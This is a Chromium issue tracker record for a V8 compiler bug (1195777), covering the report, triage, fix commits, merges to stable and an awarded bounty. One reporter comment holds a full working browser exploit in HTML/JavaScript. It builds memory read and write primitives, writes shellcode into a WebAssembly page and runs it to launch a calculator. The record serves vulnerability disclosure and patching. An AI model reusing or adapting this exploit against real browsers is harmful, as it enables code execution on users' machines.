# Security: Incorrect representation change from Word64 to Word32

| Field | Value |
|-------|-------|
| **Issue ID** | [40055451](https://issues.chromium.org/issues/40055451) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ve...@gmail.com |
| **Assignee** | ne...@chromium.org |
| **Created** | 2021-04-05 |
| **Bounty** | $20,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following PoC generates a v8 incorrect optimization of left shift operator, which leads to optimized function return value to be different than unoptimized function return value, similarly to <https://bugs.chromium.org/p/chromium/issues/detail?id=880207>

This PoC works on ​both debug and release builds of the latest v8 version 73787 at commit: <https://crrev.com/b2ae9951d4a12b996532022959f44a0cd10184ec>

**VERSION**  

Chrome Version: 89.0.4389.114 64 bits + Stable  

Operating System: Windows 10 x64 + Linux Ubuntu 20 x64

**REPRODUCTION CASE**

z=(a)=>{let y = (new Date(42)).getMilliseconds(); let i = -1; if (a) i = 0xffffffff; return Math.max(1 << y, i, 1 + y) > y}

console.log(z(true)) //prints true  

for (let i = 0; i < 0x10000; ++i) z(false)  

console.log(z(true)) //prints false

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of bug: optimized function return value is different than unoptimized

on Linux Ubuntu 20 x64 at d8: optimized function return value is different than unoptimized

on Windows 10 x64 at Chrome Browser: optimized function return value is different than unoptimized

**CREDIT INFORMATION**  

Reporter credit: Jose Martinez tr0y4 from VerSprite Inc.

## Timeline

### [Deleted User] (2021-04-05)

[Empty comment from Monorail migration]

### dr...@chromium.org (2021-04-05)

Thanks for the report! I can confirm this works as described. neis@ - can you triage further? I don't know if this has any security implications.

[Monorail components: Blink>JavaScript>Compiler]

### ne...@chromium.org (2021-04-07)

Thanks, will look at this (and the others) today.

### ne...@chromium.org (2021-04-07)

Something is going wrong during SimplifiedLowering. Security relevance still unclear.

### ne...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### jm...@gmail.com (2021-04-07)

Hello, I've submitted the other bugs http://crbug.com/1196164 and http://crbug.com/1196169 with my company email, could you please add versprite.research@gmail.com as a viewer of this bug, please?
Thanks

### ne...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-07)

I have a preliminary fix but I want to think more about it and discuss it with Nico who'll be back next Monday.

This bug can probably be exploited for OOB access or worse.

### ne...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-07)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ve...@gmail.com (2021-04-07)

Hello, is the pwn2own bug from today a duplicate of this bug?

### ne...@chromium.org (2021-04-08)

No.

### jm...@gmail.com (2021-04-12)

Hello, I'm providing an RCE PoC, please run --no-sandbox, so a Calculator.exe will be launched with the newest Chrome in Windows 10 x64:



<html><script>
bug=(a)=>{
  let y = -0; let x = 0; if (a) x = 1.1
  let w = Math.abs(1 + Math.max(x << y, (x ? 3 : -3) >>> y))
  let z = 0 - Math.sign(a ? 0 : w)
  let v = ''; try{v = new Array(z); v.pop()}catch(er){}
  return [v, [0.1, 0.1, 0.1]]
}
for (i = 0; i < 0x5000; ++i) bug(true); let b = bug(false)
a1 = b[0];    console.log('a1.length is negative:', a1.length)
a2 = b[1];    console.log('a2.length is 3:', a2.length)
a1[16] = 123; console.log('a2.length is 123:', a2.length)
a3 = [a2[3], 0.1]
f = new Float64Array(1)
u = new BigUint64Array(f.buffer)
BigInt.prototype.i2f = function(){u[0] = this; return f[0]}
Number.prototype.f2i = function(){f[0] = this; return u[0]}
function addrof(k){a1[7] = k; return a2[0].f2i()}
a2[0] = (addrof(a3) + 32n).i2f()
a4 = a1[7]
function read8(k){a3[1] = (k - 8n).i2f(); return a4[0].f2i()}
function write8(k, v){a3[1] = (k - 8n).i2f(); a4[0] = v.i2f()}
c = [0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]
w = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(c)))
m = new ArrayBuffer(599)
d = new DataView(m)
write8(addrof(m) + 0x14n, read8(addrof(w) + 0x68n))
s = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957]
for (i = 0; i < s.length; i++) d.setUint32(i * 4, s[i], true)
w.exports.main()
</script>





### ne...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/fd29e246f65a7cee130e72cd10f618f3b82af232

commit fd29e246f65a7cee130e72cd10f618f3b82af232
Author: Georg Neis <neis@chromium.org>
Date: Mon Apr 12 10:53:24 2021

[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor

We have to respect the TypeCheckKind.

Bug: chromium:1195777
Change-Id: If1eed719fef79b7c61d99c29ba869ddd7985c413
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2817791
Commit-Queue: Georg Neis <neis@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/heads/master@{#73909}

[modify] https://crrev.com/fd29e246f65a7cee130e72cd10f618f3b82af232/src/compiler/representation-change.cc
[add] https://crrev.com/fd29e246f65a7cee130e72cd10f618f3b82af232/test/mjsunit/compiler/regress-1195777.js


### ne...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-12)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M89. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M90. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to future beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M91. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ne...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-12)

This bug requires manual review: We are only 0 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2021-04-13)

+adetaylor@ (Security TPM) for merge review, CL not made it  to canary yet.

Could this be related to https://bugs.chromium.org/p/chromium/issues/detail?id=1196683#c23?

### ad...@chromium.org (2021-04-13)

I'll approve merge once we've got a bit of canary coverage.

> Could this be related to https://bugs.chromium.org/p/chromium/issues/detail?id=1196683#c23?

At the very least, it seems like folks now have an easy recipe to go from V8 unit tests to exploit code, so I suspect an urgent-ish release will be required. But _hopefully_ we can wait a few days to get M90 out the door first.

### ne...@chromium.org (2021-04-13)

Re https://crbug.com/chromium/1195777#c22, it is a different bug (but no less serious).

### [Deleted User] (2021-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-13)

Your change meets the bar and is auto-approved for M91. Please go ahead and merge the CL to branch 4472 (refs/branch-heads/4472) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pb...@google.com (2021-04-14)

[Bulk Edit] Your change has been auto-approved for M91. Please go ahead and merge the CL to branch 4472 (refs/branch-heads/4472) manually. asap so that it would be part of this weeks dev release.

### gi...@appspot.gserviceaccount.com (2021-04-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/09757f3b0a573a3db37a635b8a530b14ad4371c1

commit 09757f3b0a573a3db37a635b8a530b14ad4371c1
Author: Georg Neis <neis@chromium.org>
Date: Wed Apr 14 11:01:42 2021

Merged: [compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor

Revision: fd29e246f65a7cee130e72cd10f618f3b82af232

BUG=chromium:1195777
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=nicohartmann@chromium.org

Change-Id: Ie72ebfcc544cddf6adcc9ab6190ecf2d13b7da51
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2825594
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.1@{#14}
Cr-Branched-From: 0e4ac64a8cf298b14034a22f9fe7b085d2cb238d-refs/heads/9.1.269@{#1}
Cr-Branched-From: f565e72d5ba88daae35a59d0f978643e2343e912-refs/heads/master@{#73847}

[modify] https://crrev.com/09757f3b0a573a3db37a635b8a530b14ad4371c1/src/compiler/representation-change.cc
[add] https://crrev.com/09757f3b0a573a3db37a635b8a530b14ad4371c1/test/mjsunit/compiler/regress-1195777.js


### ne...@google.com (2021-04-14)

[Empty comment from Monorail migration]

### aj...@google.com (2021-04-14)

Via twitter - it looks like there is now a public poc for this https://github.com/avboy1337/1195777-chrome0day/blob/main/1195777.html

### ad...@google.com (2021-04-14)

Approving merge to M90, assuming no problems showed up in Canary.

### gi...@appspot.gserviceaccount.com (2021-04-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/512cd5e179f455f2c0c73c115cb5271951458f1e

commit 512cd5e179f455f2c0c73c115cb5271951458f1e
Author: Georg Neis <neis@chromium.org>
Date: Wed Apr 14 11:19:44 2021

Merged: [compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor

Revision: fd29e246f65a7cee130e72cd10f618f3b82af232

BUG=chromium:1195777
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=nicohartmann@chromium.org

Change-Id: I0400b3ae5736ef86dbeae558d15bfcca2e9f351a
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2826114
Commit-Queue: Georg Neis <neis@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.0@{#34}
Cr-Branched-From: bd0108b4c88e0d6f2350cb79b5f363fbd02f3eb7-refs/heads/9.0.257@{#1}
Cr-Branched-From: 349bcc6a075411f1a7ce2d866c3dfeefc2efa39d-refs/heads/master@{#73001}

[modify] https://crrev.com/512cd5e179f455f2c0c73c115cb5271951458f1e/src/compiler/representation-change.cc
[add] https://crrev.com/512cd5e179f455f2c0c73c115cb5271951458f1e/test/mjsunit/compiler/regress-1195777.js


### ne...@google.com (2021-04-14)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-16)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-04-20)

[Empty comment from Monorail migration]

### gi...@google.com (2021-04-20)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/bbc59d124ef39ba28061b0f60006f89b21d9d8df

commit bbc59d124ef39ba28061b0f60006f89b21d9d8df
Author: Georg Neis <neis@chromium.org>
Date: Mon Apr 12 10:53:24 2021

M86-LTS: [compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor

We have to respect the TypeCheckKind.

(cherry picked from commit fd29e246f65a7cee130e72cd10f618f3b82af232)

No-Try: true
No-Presubmit: true
No-Tree-Checks: true
Bug: chromium:1195777
Change-Id: If1eed719fef79b7c61d99c29ba869ddd7985c413
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2817791
Commit-Queue: Georg Neis <neis@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#73909}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2838235
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Reviewed-by: Artem Sumaneev <asumaneev@google.com>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/8.6@{#79}
Cr-Branched-From: a64aed2333abf49e494d2a5ce24bbd14fff19f60-refs/heads/8.6.395@{#1}
Cr-Branched-From: a626bc036236c9bf92ac7b87dc40c9e538b087e3-refs/heads/master@{#69472}

[modify] https://crrev.com/bbc59d124ef39ba28061b0f60006f89b21d9d8df/src/compiler/representation-change.cc
[add] https://crrev.com/bbc59d124ef39ba28061b0f60006f89b21d9d8df/test/mjsunit/compiler/regress-1195777.js


### ad...@google.com (2021-04-20)

[Empty comment from Monorail migration]

### as...@google.com (2021-04-21)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-04-23)

Congratulations, Jose! The VRP Panel has decided to award you $20,000 for this report. A member of our finance team will be in touch soon to arrange payment. Thank you for your efforts and submitting this issue to us! 

### jm...@gmail.com (2021-04-25)

Thank you very much!!!

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### jm...@gmail.com (2021-04-26)

Hi! could you please use my company email versprite.research@gmail.com for this reward?
Thank you
Best regards,
Jose


### am...@chromium.org (2021-04-26)

Hi Jose, updated on both our and finance's site. 

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### ad...@google.com (2021-05-12)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1195777?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1195774, crbug.com/chromium/1196164, crbug.com/chromium/1196169, crbug.com/chromium/1199020]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055451)*
